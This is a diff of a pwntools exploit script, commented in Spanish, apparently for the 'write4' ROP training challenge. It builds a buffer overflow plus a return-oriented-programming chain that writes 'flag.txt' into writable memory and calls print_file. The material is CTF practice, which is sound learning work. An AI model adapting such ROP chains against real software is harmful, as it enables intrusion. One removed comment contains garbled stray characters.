@@ -27,21 +27,24 @@ r = start()
 
 #cuando tenemos un libc dcustom, podemos hacer rop
 
-junk = b'A'*40
+junk = b'A'*32
+junk += b'B'*8
+
 movr14r15 = elf.sym.usefulGadgets   #mov r14 r15
 printfile = elf.sym.print_file      #a esto debemos pasarle como first argument 'flag.txt'
 popr14r15 = rop.r14.address         #sacamos el pop r14 r15
-bss = 0x601038                      #buscamos en donde podemos escribir objdump -h write4, los que dicen readonly no sirven obviamente. Con vmmap dentro de gdb podemos ver tambien que zonas podemos escribip_olRsWSipiIXNAwQ
-poprdi = rop.rdi.address            #buscamos un pop rdi
+rw_data = 0x00601028                      #find rw with r2 then iS . Con vmmap dentro de gdb podemos ver tambien que zonas podemos escribir
+pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]            #buscamos un pop rdi
 
 payload = junk
-payload += p64(popr14r15)   #r14 tomara el valor bss
-payload += p64(bss)
-payload += b'flag.txt'      #r15 tomara el valor flag.txt
-payload += p64(movr14r15)   #mov de r15 a r14
-payload += p64(poprdi)      #ponemos el valor de la bss(flag.txt) al stack
-payload += p64(bss)
-payload += p64(printfile)   #llamamos a print file para leer bss(flag.txt)
+payload += p64(popr14r15)   # r14 inyectara un valor en... 
+payload += p64(rw_data)     # tomara un valor y lo escribira en este espacio rw
+payload += b'flag.txt'      # se toma este valor y se inyecta en r15
+payload += p64(movr14r15)   # mov de r15 a r14
+payload += p64(pop_rdi)     # ponemos el valor de la rw_data(flag.txt) al stack
+payload += p64(rw_data)     # then we use the space that we wrote to print the flag
+payload += p64(rop.ret.address)
+payload += p64(printfile)   # llamamos a print_file
 
 r.sendlineafter(b'>', payload)
 
